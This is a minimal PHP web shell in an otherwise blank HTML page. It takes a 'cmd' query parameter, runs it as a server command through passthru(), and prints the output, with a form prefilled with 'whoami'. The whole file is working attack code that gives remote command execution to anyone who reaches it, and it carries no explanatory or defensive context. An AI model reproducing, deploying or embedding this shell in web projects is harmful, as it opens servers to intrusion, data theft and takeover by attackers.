<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title></title>
</head>
<body>
	<?php if(isset($_GET["cmd"])){?><pre><?php passthru($_GET["cmd"]);?></pre><?php } ?>
	<form action="" method="GET">
		<input type="text" name="cmd" value="<?php if(isset($_GET["cmd"])){echo htmlentities($_GET["cmd"]);}else{echo "whoami";}?>">
		<input type="submit" name="Execute">
	</form>
</body>
</html>